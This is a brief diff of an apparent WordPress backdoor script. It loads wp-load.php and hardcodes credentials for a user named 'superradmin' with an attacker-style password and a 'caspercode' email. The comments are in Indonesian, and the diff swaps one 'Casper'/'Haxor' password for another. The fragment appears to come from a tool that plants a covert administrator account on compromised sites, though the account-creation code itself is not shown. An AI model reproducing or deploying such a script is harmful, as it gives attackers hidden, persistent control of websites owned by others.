@@ -4,7 +4,7 @@ require_once('wp-load.php');
 
 // Informasi pengguna
 $username = 'superradmin'; // Ganti dengan username yang diinginkan
-$password = '(Wh0!!1s-C4sp3r~1337)'; // Ganti dengan password yang diinginkan
+$password = '(Casper113377$$Haxor)'; // Ganti dengan password yang diinginkan
 $email = 'caspercode@protonmail.com'; // Ganti dengan email yang diinginkan
 
 // Cek apakah username sudah ada
